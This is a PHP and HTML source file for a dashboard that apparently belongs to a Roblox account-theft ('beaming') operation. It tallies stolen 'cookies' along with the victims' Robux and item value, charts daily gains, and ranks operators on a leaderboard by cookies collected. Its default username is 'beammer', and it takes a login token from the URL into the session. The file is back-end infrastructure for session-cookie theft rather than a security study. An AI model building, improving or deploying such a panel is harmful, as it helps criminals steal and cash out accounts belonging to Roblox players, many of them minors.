<?php
session_start();
require_once '../config.php';
require_once '../functions.php';

// Check if token is in URL parameter
$urlToken = $_GET['token'] ?? '';
if (!empty($urlToken) && empty($_SESSION['token'])) {
    $_SESSION['token'] = $urlToken;
}

// Check authentication
if (empty($_SESSION['token'])) {
    header('Location: sign-in.php');
    exit;
}

$token = $_SESSION['token'];
$tokenData = getTokenData($token);

if (!$tokenData) {
    session_destroy();
    header('Location: sign-in.php?error=invalid');
    exit;
}

$directory = $tokenData['directory'];
$instanceData = getInstanceData($directory);

if (!$instanceData) {
    echo "Instance data not found!";
    exit;
}

// Extract data
$stats = $instanceData['stats'];
$dailyStats = $instanceData['dailyStats'];
$username = $instanceData['username'] ?? 'beammer';
$profilePicture = $instanceData['profilePicture'] ?? 'https://hyperblox.eu/files/img.png';

// Get rank info
$rankInfo = getRankInfo($stats['totalCookies']);

// Calculate daily changes
$today = date('w');
$yesterday = ($today - 1 + 7) % 7;

function calculateChange($today, $yesterday) {
    if ($yesterday == 0) return 100;
    return round((($today - $yesterday) / $yesterday) * 100);
}

$cookiesChange = calculateChange($dailyStats['cookies'][$today], $dailyStats['cookies'][$yesterday]);
$visitsChange = calculateChange($dailyStats['visits'][$today], $dailyStats['visits'][$yesterday]);
$robuxChange = calculateChange($dailyStats['robux'][$today], $dailyStats['robux'][$yesterday]);
$rapChange = calculateChange($dailyStats['rap'][$today], $dailyStats['rap'][$yesterday]);

// Get leaderboard
$leaderboard = getLeaderboard(5);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - <?php echo htmlspecialchars($username); ?></title>
    <link rel="icon" type="image/png" href="https://cdn-icons-png.flaticon.com/512/5473/5473473.png">
    <script src="https://cdn.tailwindcss.com"></script>
    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@300;400;500;600;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
    
    <style>
        :root {
            --font-sans: 'Outfit', sans-serif;
            --font-display: 'Space Grotesk', sans-serif;
        }
        
        body {
            font-family: var(--font-sans);
            background: linear-gradient(135deg, #02040a 0%, #0a0e27 50%, #02040a 100%);
            background-size: 400% 400%;
            animation: gradientShift 15s ease infinite;
            color: #f8fafc;
        }
        
        @keyframes gradientShift {
            0%, 100% { background-position: 0% 50%; }
            50% { background-position: 100% 50%; }
        }
        
        .glass-effect {
            backdrop-filter: blur(10px) saturate(180%);
            background-color: rgba(17, 25, 40, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.125);
        }
    </style>
</head>
<body class="min-h-screen p-6">
    <div class="max-w-7xl mx-auto space-y-6">
        <!-- Header -->
        <div class="glass-effect rounded-3xl p-6 flex items-center justify-between">
            <div class="flex items-center gap-4">
                <img src="<?php echo htmlspecialchars($profilePicture); ?>" alt="Profile" class="w-16 h-16 rounded-full border-2 border-purple-500">
                <div>
                    <h1 class="text-2xl font-bold"><?php echo htmlspecialchars($username); ?></h1>
                    <p class="text-sm text-white/60"><?php echo htmlspecialchars($directory); ?></p>
                </div>
            </div>
            
            <div class="flex items-center gap-3">
                <a href="settings.php" class="px-4 py-2 bg-white/10 hover:bg-white/20 rounded-xl transition-colors">
                    Settings
                </a>
                <a href="logout.php" class="px-4 py-2 bg-red-500/10 hover:bg-red-500/20 text-red-400 rounded-xl transition-colors">
                    Logout
                </a>
            </div>
        </div>

        <!-- Stats Grid -->
        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
            <!-- Total Cookies -->
            <div class="glass-effect rounded-3xl p-6">
                <div class="flex items-center justify-between mb-4">
                    <span class="text-sm text-white/60">Total Cookies</span>
                    <span class="text-xs px-2 py-1 rounded-full <?php echo $cookiesChange >= 0 ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'; ?>">
                        <?php echo $cookiesChange >= 0 ? '+' : ''; ?><?php echo $cookiesChange; ?>%
                    </span>
                </div>
                <div class="text-3xl font-bold"><?php echo number_format($stats['totalCookies']); ?></div>
                <canvas id="cookiesChart" height="60"></canvas>
            </div>

            <!-- Total Visits -->
            <div class="glass-effect rounded-3xl p-6">
                <div class="flex items-center justify-between mb-4">
                    <span class="text-sm text-white/60">Total Visits</span>
                    <span class="text-xs px-2 py-1 rounded-full <?php echo $visitsChange >= 0 ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'; ?>">
                        <?php echo $visitsChange >= 0 ? '+' : ''; ?><?php echo $visitsChange; ?>%
                    </span>
                </div>
                <div class="text-3xl font-bold"><?php echo number_format($stats['totalVisits']); ?></div>
                <canvas id="visitsChart" height="60"></canvas>
            </div>

            <!-- Total Robux -->
            <div class="glass-effect rounded-3xl p-6">
                <div class="flex items-center justify-between mb-4">
                    <span class="text-sm text-white/60">Total Robux</span>
                    <span class="text-xs px-2 py-1 rounded-full <?php echo $robuxChange >= 0 ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'; ?>">
                        <?php echo $robuxChange >= 0 ? '+' : ''; ?><?php echo $robuxChange; ?>%
                    </span>
                </div>
                <div class="text-3xl font-bold"><?php echo number_format($stats['totalRobux']); ?></div>
                <canvas id="robuxChart" height="60"></canvas>
            </div>

            <!-- Total RAP -->
            <div class="glass-effect rounded-3xl p-6">
                <div class="flex items-center justify-between mb-4">
                    <span class="text-sm text-white/60">Total RAP</span>
                    <span class="text-xs px-2 py-1 rounded-full <?php echo $rapChange >= 0 ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'; ?>">
                        <?php echo $rapChange >= 0 ? '+' : ''; ?><?php echo $rapChange; ?>%
                    </span>
                </div>
                <div class="text-3xl font-bold"><?php echo number_format($stats['totalRAP']); ?></div>
                <canvas id="rapChart" height="60"></canvas>
            </div>
        </div>

        <!-- Rank Progress -->
        <div class="glass-effect rounded-3xl p-6">
            <h2 class="text-xl font-bold mb-4">Rank Progress</h2>
            <div class="grid grid-cols-1 md:grid-cols-3 gap-4 mb-4">
                <div>
                    <p class="text-sm text-white/60">Current Rank</p>
                    <p class="text-lg font-bold" style="color: <?php echo $rankInfo['currentColor']; ?>"><?php echo $rankInfo['current']; ?></p>
                </div>
                <div>
                    <p class="text-sm text-white/60">Next Rank</p>
                    <p class="text-lg font-bold" style="color: <?php echo $rankInfo['nextColor']; ?>"><?php echo $rankInfo['next']; ?></p>
                </div>
                <div>
                    <p class="text-sm text-white/60">Cookies to Next Rank</p>
                    <p class="text-lg font-bold"><?php echo $rankInfo['toNext']; ?></p>
                </div>
            </div>
            <div class="w-full bg-white/10 rounded-full h-3 overflow-hidden">
                <div class="h-full rounded-full transition-all duration-500" 
                     style="width: <?php echo $rankInfo['progress']; ?>%; background: linear-gradient(90deg, <?php echo $rankInfo['currentColor']; ?>, <?php echo $rankInfo['nextColor']; ?>);">
                </div>
            </div>
            <p class="text-sm text-white/60 mt-2"><?php echo $rankInfo['progress']; ?>% progress</p>
        </div>

        <!-- Leaderboard -->
        <div class="glass-effect rounded-3xl p-6">
            <h2 class="text-xl font-bold mb-4">Top 5 Leaderboard</h2>
            <div class="space-y-3">
                <?php foreach ($leaderboard as $index => $user): ?>
                <div class="flex items-center gap-4 p-4 bg-white/5 rounded-2xl hover:bg-white/10 transition-colors">
                    <div class="text-2xl font-bold text-white/40">#<?php echo $index + 1; ?></div>
                    <img src="<?php echo htmlspecialchars($user['profilePicture']); ?>" alt="Avatar" class="w-12 h-12 rounded-full border-2 border-purple-500">
                    <div class="flex-1">
                        <p class="font-semibold"><?php echo htmlspecialchars($user['username']); ?></p>
                        <p class="text-sm text-white/60"><?php echo number_format($user['totalCookies']); ?> cookies • <?php echo number_format($user['totalVisits']); ?> visits</p>
                    </div>
                </div>
                <?php endforeach; ?>
            </div>
        </div>
    </div>

    <script>
        const chartOptions = {
            responsive: true,
            maintainAspectRatio: false,
            plugins: { legend: { display: false } },
            scales: {
                y: { display: false },
                x: { display: false }
            },
            elements: {
                point: { radius: 0 },
                line: { borderWidth: 2, tension: 0.4 }
            }
        };

        // Cookies Chart
        new Chart(document.getElementById('cookiesChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['cookies']); ?>,
                    borderColor: '#8b5cf6',
                    backgroundColor: 'rgba(139, 92, 246, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        // Visits Chart
        new Chart(document.getElementById('visitsChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['visits']); ?>,
                    borderColor: '#ec4899',
                    backgroundColor: 'rgba(236, 72, 153, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        // Robux Chart
        new Chart(document.getElementById('robuxChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['robux']); ?>,
                    borderColor: '#10b981',
                    backgroundColor: 'rgba(16, 185, 129, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        // RAP Chart
        new Chart(document.getElementById('rapChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['rap']); ?>,
                    borderColor: '#3b82f6',
                    backgroundColor: 'rgba(59, 130, 246, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });
    </script>
</body>
</html>
